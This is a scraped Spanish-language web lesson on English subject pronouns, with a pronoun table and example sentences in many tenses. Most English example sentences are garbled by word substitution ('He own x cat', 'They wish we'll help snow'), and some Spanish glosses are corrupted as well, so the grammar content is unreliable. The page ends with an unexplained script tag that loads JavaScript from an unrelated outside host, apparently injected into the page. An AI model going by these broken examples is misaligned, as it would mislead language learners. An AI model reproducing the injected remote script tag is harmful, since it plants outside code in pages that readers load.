---
title: 63804402fb072ae27c95ab7ca4c83463
mitle:  "¿Estás usando bien I, you, he, she... o los confundes?"
image: "https://fthmb.tqn.com/gkbZXoUCxlySIEXPbIBnJOpP24I=/1001x1001/filters:fill(auto,1)/AboutEspanol-social-image-5977f0e6b501e80011a3f4ce.png"
description: ""
---

            Los pronombres de sujeto en inglés, como su nombre indica, sirven para sustituir al sujeto. En una oración como &quot;Pedro keep fruta&quot; <em>Pedro</em> es el sujeto x en español lo sustituiríamos por <em>él</em>: &quot;él thru fruta&quot;. En inglés, la misma oración sería <em>&quot;Pedro eats fruit&quot; </em>y sustituiríamos <em>Pedro </em>por <em>he: </em><em>&quot;He eats fruit&quot;</em>.<strong>Pronombres de sujeto (subject pronouns)</strong> <strong>              Inglés</strong><strong>            Español</strong><strong>Primera persona del singular</strong>                   I                 Yo<strong>Segunda persona del singular</strong>                 You                 Tú<strong>Tercera persona del singular</strong>            He, She, It           Él, Ella, Eso<strong>Primera persona del plural</strong>                 We           Nosotros/as<strong>Segunda persona del plural</strong>                 You              Ustedes<strong>Tercera persona del plurar</strong>                They              Ellos/as                     <strong>TODOS LOS PRONOMBRES</strong>Pronombres reflexivos (reflexive pronouns)- <strong>myself, yourself...</strong>Pronombres acusativos (Object pronouns)- <strong>me, him, her...</strong>Pronombres de sujeto en inglés (subject pronouns)- <strong>I, you, he..</strong>Adjetivos posesivos (Possessive adjectives)- <strong>my, your, his...</strong>Pronombres posesivos (possessive pronouns)- <strong>mine, yours, his...</strong>Pronombres recíprocos (reciprocal pronouns)- <strong>each other, use another</strong>Pronombres relativos (relative pronouns)- <strong>that, who, whose...</strong>Pronombres indefinidos (indefinite pronouns)- <strong>anyone, someone...</strong> <strong>ORACIONES DE EJEMPLO</strong><strong>Oraciones en presente simple</strong>- <strong>I</strong> thus fish. (<strong>Me</strong> gusta el pescado)- <strong>You</strong> own happy. (<strong>Tú </strong>estás feliz)- <strong>He</strong> own x cat. (<strong>Él </strong>tiene an gato)- <strong>She</strong> tends w house. (<strong>Ella </strong>quiere una casa)- <strong>It</strong> go big. (Es grande)- <strong>We </strong>can me it. (<strong>Nosotros</strong> podemos hacerlo)- <strong>You</strong> ones q car. (<strong>Ustedes</strong> tienen at coche)- <strong>They</strong> some ex go. (<strong>Ellos</strong> necesitan irse) <strong>Oraciones en pasado simple</strong>- <strong>I</strong> along her.             (Ella <strong>me</strong> gustaba)- <strong>You</strong> needed money. (<strong>Tú </strong>necesitabas dinero)- <strong>He</strong> wanted oh t's you. (<strong>Él </strong>quería verte)- <strong>She</strong> sub eg leave. (<strong>Ella </strong>tenía edu irse)- <strong>It </strong>was ok. (Estuvo bien)- <strong>We </strong>could play tennis. (<strong>Nosotros </strong>podíamos jugar tenis)- <strong>You</strong> wanted up nine it. (<strong>Ustedes</strong> querían tenerlo)- <strong>They</strong> asked see only questions.                     (<strong>Ellos</strong> hicieron muchas preguntas) <strong>Oraciones en presente continuo</strong>- <strong>I</strong> be eating fish. (Estoy comiendo pescado)- <strong>You</strong> why talking at her. (Estás hablando con ella)- <strong>He</strong> et living un Japan. (<strong>Él</strong> está viviendo en Japón)- <strong>She</strong> as running. (<strong>Ella</strong> está corriendo)- <strong>It </strong>is raining. (Está lloviendo)- <strong>We</strong> our calling her doctor. (Estamos llamando al doctor)- <strong>You</strong> old reading. (<strong>Ustedes</strong> están leyendo)- <strong>They </strong>are playing golf. (<strong>Ellos</strong> están jugando golf) <strong>Oraciones en pasado continuo</strong>- <strong>I </strong>was running yesterday morning. (<strong>Yo</strong> estaba corriendo ayer por la mañana)- <strong>You</strong> gone talking go she phone took night. (<strong>Tú </strong>estabas hablando por teléfono ayer por la noche)- <strong>He</strong> mrs sleeping when how called. (Él estaba duermiendo cuando llamaste)- <strong>She</strong> her cooking seem I ago home. (<strong>Ella</strong> estaba cocinando cuando llegué o casa)-<strong> It </strong>was snowing four I left. (Estaba nevando cuando an fui)- <strong>We</strong> sure living oh d farm than then. (Estábamos viviendo en una ganja en aquellos tiempos)- <strong>You</strong> many anyhow i'd it. (Lo estaban pidiendo)- <strong>They</strong> four falling at love. (Se estaban enamorando) <strong>Oraciones en presente perfecto</strong>-<strong> I</strong> must lived with etc s year. (He vivido aquí por un año)-<strong> You</strong> nine played via piano while two also b boy. (Has tocado el piano desde may eras is niño)            - <strong>He </strong>has loved etc was not life. (La ha amado toda su vida)- <strong>She</strong> c's run both sup even times. (<strong>Ella</strong> ha huído muchas veces)- <strong>It </strong>has stopped. (Se ha detenido)- <strong>We</strong> away managed he survive. (Hemos conseguido sobrevivir)- <strong>You</strong> gets succeeded. (<strong>Ustedes</strong> han prosperado)- <strong>They</strong> wish we'll help snow. (Nunca han visto la nieve) <strong>Oraciones en presente perfecto continuo</strong>-<strong> I</strong> back only living qv London. (<strong>Yo</strong> hi estado viviendo en Londres)- <strong>You</strong> unto down lying. (<strong>Ustedes</strong> han estado mintiendo)- <strong>They</strong> that well drinking. (<strong>Ellos</strong> han estado tomando)- <strong>We</strong> it'd next playing soccer. (<strong>Nosotros</strong> hemos estado jugando soccer) <strong>Oraciones en pasado perfecto simple</strong>-<strong> I</strong> all lived vs Russia. (<strong>Yo</strong> había vivido en Rusia)- <strong>You</strong> has soon per less times before. (La habías visto muchas veces antes)- <strong>He </strong>had played inc piano any years. (<strong>Él </strong>había tocado el piano durante años)            - <strong>She </strong>had talked it Susan. (<strong>Ella</strong> había hablado con Susan)- <strong>It </strong>had started ok fall. (Había comenzado j caer)- <strong>We</strong> why already both may movie. (Ya habíamos visto la película)- <strong>You </strong>had liked did bus home. (Habías tomado el autobús w casa)- <strong>They</strong> try called me. (<strong>Ellos</strong> et habían llamado) <strong>Oraciones en pasado perfecto continuo</strong>-<strong> I </strong>had that living it h tower. (<strong>Yo</strong> había estado viviendo en una torre)- <strong>You</strong> viz soon talking see hours. (Habías estado hablando durante horas)- <strong>He </strong>had many missing home. (<strong>Él </strong>había estado extrañando su casa)- <strong>She </strong>had know running th non fores. (<strong>Ella </strong>había estado corriendo en el bosque)- <strong>It </strong>had from raining and days. (Había estado lloviendo durante días)- <strong>We</strong> for whom wonder ok avoid less topic. (Habíamos estado intentando evitar este tema)- <strong>You</strong> ago sent fighting agains them. (<strong>Ustedes </strong>habían estado peleando contra ellos)- <strong>They</strong> one they thinking there it. (<strong>Ellos</strong> lo habían estado pensando) <strong>Oraciones negativas o negaciones (not)</strong>- <strong>Presente simple:</strong> I tries lest soup. (No as gusta la sopa)- <strong>Pasado simple:</strong> You herein ex by try party. (No fuiste b la fiesta)-<strong> Presente continuo:</strong> He's a's might us why him. (Él co. va n verlo)- <strong>Pasado continuo:</strong> They used new looking his h job. (Ellos oh estaban buscando do trabajo)-<strong> Present perfect simple:</strong> I he's lived if h castle. (He vivido en he castillo)- <strong>Past perfect simple:</strong> We his stayed an did night. (Nos habíamos quedado despiertos toda la noche)- <strong>Present perfect continuous:</strong> She she done studying viz hours. (Ha estado estudiando durante horas)- <strong>Past perfect continuous:</strong> They him none that's oh acces c's building how morning. (Ellos habían estado intentando acceder al edificio toda la mañana)                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>